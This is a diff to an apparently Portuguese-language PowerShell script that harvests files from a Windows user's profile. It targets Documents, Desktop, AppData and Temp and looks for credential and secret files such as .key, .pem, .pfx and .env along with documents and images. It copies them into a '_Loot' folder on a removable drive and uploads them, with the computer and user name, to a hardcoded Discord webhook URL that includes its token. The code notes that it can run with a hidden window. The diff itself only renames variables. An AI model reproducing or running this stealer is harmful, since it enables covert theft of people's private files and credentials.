@@ -2,7 +2,7 @@
 .SYNOPSIS
     Coleta arquivos e envia para Discord via webhook.
 .NOTES
-    Versao sem caracteres especiais para evitar erros de parser.
+    Versao ASCII - sem acentos, cedilhas ou emojis.
 #>
 
 $webhookUrl = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
@@ -171,7 +171,7 @@ $drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } |
 $driveLetter = $drive.DeviceID
 Write-Host "Drive: $driveLetter/" -ForegroundColor Green
 
-$extensions = @("*.log","*.db","*.txt","*.json","*.doc","*.pdf","*.jpg","*.jpeg","*.png","*.cer","*.key","*.xls","*.xlsx","*.cfg","*.conf","*.docx","*.pptx","*.ppt","*.ppsx","*.pptm","*.potx","*.env","*.yaml","*.config","*.csv","*.forms","*.pem","*.crt","*.pkcs12","*.pfx")
+$fileExtensions = @("*.log","*.db","*.txt","*.json","*.doc","*.pdf","*.jpg","*.jpeg","*.png","*.cer","*.key","*.xls","*.xlsx","*.cfg","*.conf","*.docx","*.pptx","*.ppt","*.ppsx","*.pptm","*.potx","*.env","*.yaml","*.config","*.csv","*.forms","*.pem","*.crt","*.pkcs12","*.pfx")
 $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos","$env:USERPROFILE\AppData\Local","$env:USERPROFILE\AppData\Roaming","$env:USERPROFILE\AppData\Local\Temp","$env:TEMP") | Where-Object { Test-Path $_ }
 
 $destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"
@@ -180,7 +180,7 @@ if (-not (Test-Path $destinationPath)) {
     Write-Host "Pasta: $destinationPath" -ForegroundColor Green
 }
 
-# Hide-Window  # Descomente se quiser ocultar a janela (mas com -WindowStyle Hidden já está oculta)
+# Hide-Window  # Descomente se quiser ocultar a janela
 
 $driveIndex = 0
 $collectedFiles = @()
@@ -190,7 +190,7 @@ $totalFilesFound = 0
 Write-Host "Coletando..." -ForegroundColor Cyan
 foreach ($folder in $foldersToSearch) {
     Write-Host "Pasta: $folder" -ForegroundColor Gray
-    foreach ($ext in $extensions) {
+    foreach ($ext in $fileExtensions) {
         try {
             $files = Get-ChildItem -Path $folder -Recurse -Filter $ext -File -ErrorAction SilentlyContinue
             foreach ($file in $files) {
@@ -242,11 +242,11 @@ if ($collectedFiles.Count -gt 0) {
     Write-Host "Enviando para Discord..." -ForegroundColor Cyan
     $result = Send-FilesToDiscord -FolderPath $destinationPath -WebhookUrl $webhookUrl -MaxFiles $maxFilesPerBatch -MaxSizeBytes $maxFileSizeBytes
     
-    $summary = "[Coleta Concluida] Pasta: $destinationPath Total: $totalFilesFound Coletados: $($collectedFiles.Count) Enviados: $($result.sent) Ignorados: $($result.skipped + $skippedLargeFiles) Computador: $env:COMPUTERNAME Usuario: $env:USERNAME Finalizado: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
-    Send-DiscordMessage -Message $summary -WebhookUrl $webhookUrl
+    $summaryMessage = "[Coleta Concluida] Pasta: $destinationPath Total: $totalFilesFound Coletados: $($collectedFiles.Count) Enviados: $($result.sent) Ignorados: $($result.skipped + $skippedLargeFiles) Computador: $env:COMPUTERNAME Usuario: $env:USERNAME Finalizado: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
+    Send-DiscordMessage -Message $summaryMessage -WebhookUrl $webhookUrl
     
-    $endMsg = "[Sistema Finalizado] Todos os lotes enviados. Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
-    Send-DiscordMessage -Message $endMsg -WebhookUrl $webhookUrl
+    $endMessage = "[Sistema Finalizado] Todos os lotes enviados. Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
+    Send-DiscordMessage -Message $endMessage -WebhookUrl $webhookUrl
 } else {
     if ($webhookUrl -eq "SEU_WEBHOOK_URL_AQUI") {
         Write-Host "Webhook nao configurado." -ForegroundColor Red
